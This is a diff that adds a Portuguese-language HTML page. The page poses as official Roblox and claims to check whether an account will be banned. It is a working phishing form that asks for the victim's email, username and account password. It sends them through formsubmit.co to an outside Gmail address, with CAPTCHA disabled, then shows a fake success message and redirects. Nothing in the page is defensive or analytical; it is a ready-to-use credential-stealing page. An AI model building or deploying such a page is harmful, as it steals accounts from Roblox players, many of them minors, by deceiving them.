@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>ROBLOX OFICIAL</title>
+
+<style>
+body{
+font-family:Arial;
+background:#0f172a;
+color:white;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+margin:0;
+}
+
+.box{
+background:#1e293b;
+padding:30px;
+border-radius:12px;
+width:350px;
+}
+
+h1{
+text-align:center;
+}
+
+.info{
+background:#0f3d66;
+padding:15px;
+border-radius:8px;
+margin-bottom:15px;
+}
+
+input,textarea{
+width:100%;
+padding:12px;
+margin-top:10px;
+border:none;
+border-radius:6px;
+background:#374151;
+color:white;
+}
+
+button{
+margin-top:15px;
+width:100%;
+padding:12px;
+border:none;
+border-radius:6px;
+background:#14b8a6;
+color:white;
+font-size:16px;
+cursor:pointer;
+}
+
+.sucesso{
+display:none;
+background:#16a34a;
+padding:10px;
+border-radius:6px;
+text-align:center;
+margin-bottom:10px;
+}
+</style>
+
+</head>
+
+<body>
+
+<div class="box">
+
+<h1>ROBLOX OFICIAL</h1>
+
+<div class="sucesso" id="msg">
+Solicitação enviada com sucesso ✅
+</div>
+
+<div class="info">
+Envie sua solicitação para ver se sua conta nao vai se banida.
+</div>
+
+<form id="form" action="https://formsubmit.co/golpistadocaralho@gmail.com" method="POST">
+
+<input type="hidden" name="_captcha" value="false">
+
+<input type="email" name="email" placeholder="Seu Email" required>
+
+<input type="text" name="usuario" placeholder="Seu nome de usuário de rbx" required>
+
+<textarea name="mensagem" placeholder="senha da conta do rbx"></textarea>
+
+<button type="submit">Enviar Solicitação</button>
+
+</form>
+
+</div>
+
+<script>
+document.getElementById("form").addEventListener("submit",function(){
+document.getElementById("msg").style.display="block";
+
+setTimeout(function(){
+location.href="index.html";
+},2000);
+
+});
+</script>
+
+</body>
+</html>
